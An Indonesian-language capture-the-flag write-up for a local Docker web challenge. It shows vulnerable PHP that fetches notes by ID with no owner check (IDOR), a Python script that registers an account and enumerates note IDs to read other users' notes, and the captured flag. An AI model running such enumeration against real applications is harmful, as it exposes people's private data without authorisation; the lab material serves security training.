# WriteUp: Akses data

## Overview

* **Judul:** Akses data
* **Kategori:** Authorization
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu akses data orang lain?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `akses-data.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses Data]
└─$ tree
.
├── akses-data.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`akses-data.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/oto1:latest
    ports:
      - "1337:80"
    environment:
      - USERNAME=${USERNAME:-defaultuser}
    volumes:
      - app_data:/var/www/html/data
    restart: unless-stopped
volumes:
  app_data:

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses Data]
└─$ USERNAME=WanZKey docker compose -f akses-data.yml up -d --build
[+] up 14/14
 ✔ Container aksesdata-web-1 Created

```

### 2. Reconnaissance & Source Code Analysis (White Box)

Melakukan inspeksi file source code backend pada container yang berjalan untuk memahami alur autentikasi dan akses data.

**List File:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses Data]
└─$ docker exec aksesdata-web-1 ls /var/www/html/
assets
auth.php
config.php
dashboard.php
data
index.php
note.php
register.php

```

**Analisis `auth.php` (Logic Register & Login):**

```php
<?php
// ...
    if ($action === 'register') {
        // ...
        // Insert new user
        try {
            $stmt = $db->prepare('INSERT INTO users (username, password, email) VALUES (?, ?, ?)');
            $stmt->execute([$username, md5($password), $email]);
            // ...
        }
// ...

```

**Analisis `note.php` (Vulnerability Found):**

```php
<?php
// ...
$note_id = $_GET['id'] ?? '';
// ...
} else {
    // VULNERABILITY: IDOR (Insecure Direct Object Reference)
    // Query database langsung mengambil note berdasarkan ID tanpa memvalidasi 'user_id' pemiliknya.
    $stmt = $db->prepare('SELECT * FROM notes WHERE id = ?');
    $stmt->execute([$note_id]);
    $note = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$note) {
        header('Location: /dashboard.php');
        exit;
    }
// ...

```

**Temuan Celah:** Aplikasi memiliki kerentanan **IDOR**. User yang sudah login dapat mengakses endpoint `/note.php?id=<ID>` dan melihat isi catatan milik user lain (termasuk admin) hanya dengan mengganti parameter `id`.

## Script Solver

Script berikut dibuat untuk melakukan registrasi user secara otomatis (agar mendapatkan sesi valid), kemudian melakukan *brute force* pada ID Note untuk mengambil isinya.

**File:** `exploit.py`

```python
import requests
import random
import string
import re

URL = "http://localhost:1337"

def exploit():
    s = requests.Session()
    
    # --- 1. Register User Asal-asalan (Biar dapet Session) ---
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    # Register
    s.post(f"{URL}/auth.php", data={
        'action': 'register',
        'username': username,
        'password': password,
        'email': f'{username}@pwn.com'
    })
    
    # Login
    print("[*] Logging in...")
    r_login = s.post(f"{URL}/auth.php", data={
        'action': 'login',
        'username': username,
        'password': password
    })

    # --- 2. IDOR Brute Force (Tanpa Redirect) ---
    print("[*] Starting Brutal IDOR enumeration (ID 1-50)...")
    
    for i in range(1, 51): 
        try:
            # allow_redirects=False agar kita bisa baca response body sebelum diredirect jika logicnya aneh
            r = s.get(f"{URL}/note.php?id={i}", allow_redirects=False)
            
            if r.status_code == 200:
                print(f"\n[+] FOUND NOTE ID: {i}")
                
                # Ambil Judul Note
                title = re.search(r'<h1>(.*?)</h1>', r.text)
                if title:
                    print(f"    Title: {title.group(1)}")
                
                # Ambil Isi Note (Content)
                content = re.search(r'<textarea.*?>(.*?)</textarea>', r.text, re.DOTALL)
                if content:
                    print(f"    Content: {content.group(1).strip()}")

        except Exception as e:
            print(f"[-] Error accessing ID {i}: {e}")

if __name__ == "__main__":
    exploit()

```

**Output Terminal Solver:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Akses Data]
└─$ python3 exploit.py
[*] Registering user: qlmwedxp
[*] Logging in...
[*] Starting Brutal IDOR enumeration (ID 1-50)...

[+] FOUND NOTE ID: 1
    Title: Welcome to TaskFlow
    Content: This is your first note. You can create, edit, and manage your tasks here.

[+] FOUND NOTE ID: 2
    Title: Project Planning
    Content: Review the project requirements and create a timeline for deliverables.

[+] FOUND NOTE ID: 3
    Title: System Configuration
    Content: pwn{7db68e9f33eea387af6d94646989bb53}

[+] FOUND NOTE ID: 4
    Title: Team Meeting Notes
    Content: Discussed Q1 objectives and resource allocation.

[+] FOUND NOTE ID: 5
    Title: test
    Content: test

```

## Flag

```
pwn{7db68e9f33eea387af6d94646989bb53}
```
